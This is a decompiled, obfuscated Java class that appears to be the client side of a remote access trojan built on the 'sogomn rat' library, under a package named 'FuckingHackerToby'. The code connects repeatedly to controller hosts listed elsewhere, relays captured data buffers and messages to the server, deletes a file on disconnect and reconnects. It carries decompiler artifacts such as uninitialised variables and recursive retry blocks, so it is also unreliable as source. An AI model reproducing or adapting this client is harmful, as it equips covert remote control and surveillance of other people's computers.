/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.F;
import FuckingHackerToby.Ia;
import FuckingHackerToby.R;
import FuckingHackerToby.Ua;
import FuckingHackerToby.Va;
import FuckingHackerToby.Za;
import FuckingHackerToby.a;
import FuckingHackerToby.j;
import FuckingHackerToby.qa;
import FuckingHackerToby.ta;
import FuckingHackerToby.z;
import FuckingHackerToby.za;
import de.sogomn.rat.IConnectionObserver;
import java.awt.image.BufferedImage;
import java.util.Arrays;
import java.util.List;
import javax.swing.SwingUtilities;

public final class na
implements IConnectionObserver,
a {
    private static final /* synthetic */ int a = 10000;
    private /* synthetic */ ta B;
    private static final /* synthetic */ int K = 262144;
    private /* synthetic */ Za k;
    private static /* synthetic */ Thread d;
    public static /* synthetic */ boolean ALLATORIxDEMO;

    private /* synthetic */ void ALLATORIxDEMO(Ia a2) {
        na a3;
        a2 = ((Ia)a2).ALLATORIxDEMO();
        if (!a3.k.ALLATORIxDEMO()) {
            a3.k.ALLATORIxDEMO(true);
        }
        a3.k.m((String)a2);
    }

    public static /* synthetic */ void H() {
        System.out.println();
        System.out.println();
    }

    public static /* synthetic */ void main(String[] a2) {
        System.out.println("\n################################################\n#                                              #\n#        ## #   #    ## ### ### ##  ###        #\n#       # # #   #   # #  #  # # # #  #         #\n#       ### #   #   ###  #  # # ##   #         #\n#       # # ### ### # #  #  ### # # ###        #\n#                                              #\n# Obfuscation by Allatori Obfuscator v7.3 DEMO #\n#                                              #\n#           http://www.allatori.com            #\n#                                              #\n################################################\n");
        na.H();
        z.H();
        na.ALLATORIxDEMO(0);
    }

    @Override
    public /* synthetic */ void packetReceived(ta a2, j a3) {
        na a4;
        Class<?> class_ = a3.getClass();
        if (class_ == R.class) {
            a4.ALLATORIxDEMO(a2);
            return;
        }
        if (class_ == Ia.class) {
            class_ = (Ia)a3;
            a4.ALLATORIxDEMO((Ia)((Object)class_));
            return;
        }
        a3.ALLATORIxDEMO(a2);
    }

    public static /* synthetic */ {
        d = null;
        ALLATORIxDEMO = false;
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(String a2, Object a3) {
        if (a2 == "Message sent") {
            na a4;
            na na2 = a4;
            a2 = na2.k.c();
            a2 = new Ia((String)a2);
            na2.B.H((j)a2);
        }
    }

    public /* synthetic */ na(ta a2) {
        na a3;
        a3.B = a2;
        na na2 = a3;
        a3.k = new Za();
        BufferedImage[] arrbufferedImage = new BufferedImage[1];
        arrbufferedImage[0] = Ua.ALLATORIxDEMO;
        List<BufferedImage> list = Arrays.asList(arrbufferedImage);
        na na3 = a3;
        a2.ALLATORIxDEMO(na3);
        na3.k.ALLATORIxDEMO(list);
        na3.k.H(a3);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static /* synthetic */ void ALLATORIxDEMO(String a2, int a3) {
        ta ta2 = new ta(a2, a3);
        if (!ta2.isOpen()) {
            try {
                Thread.sleep(10000L);
                return;
            }
            catch (Exception exception) {
                exception.printStackTrace();
                return;
            }
            finally {
                na.ALLATORIxDEMO(a2, a3);
            }
        }
        na na2 = new na(ta2);
        ta ta3 = ta2;
        ta3.ALLATORIxDEMO(na2);
        ta3.D();
    }

    public static /* synthetic */ void D() {
        d = new qa();
        d.start();
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static /* synthetic */ void ALLATORIxDEMO(int a2) {
        if (a2 > z.a.length - 1 || a2 < 0) {
            a2 = 0;
        }
        Object object = z.a[a2];
        int n2 = z.d[a2];
        if (!((Va)(object = new ta((String)object, n2))).isOpen()) {
            try {
                Thread.sleep(10000L);
                return;
            }
            catch (Exception exception) {
                exception.printStackTrace();
                return;
            }
            finally {
                na.ALLATORIxDEMO(a2 + 1);
            }
        }
        na na2 = new na((ta)object);
        Object object2 = object;
        ((ta)object2).ALLATORIxDEMO(na2);
        ((ta)object2).D();
    }

    private /* synthetic */ void ALLATORIxDEMO(ta a2) {
        F f2 = new F(262144);
        f2.ALLATORIxDEMO((F a3) -> {
            F f2 = a3;
            a3 = f2.ALLATORIxDEMO();
            a3 = new R((byte[])a3);
            a2.H((j)a3);
            f2.H();
        });
        f2.l();
    }

    @Override
    public /* synthetic */ void disconnected(ta a2) {
        na a3;
        za.ALLATORIxDEMO(z.ALLATORIxDEMO.toFile());
        a3.k.ALLATORIxDEMO();
        a2.ALLATORIxDEMO((IConnectionObserver)null);
        SwingUtilities.invokeLater(() -> na.ALLATORIxDEMO(0));
    }
}

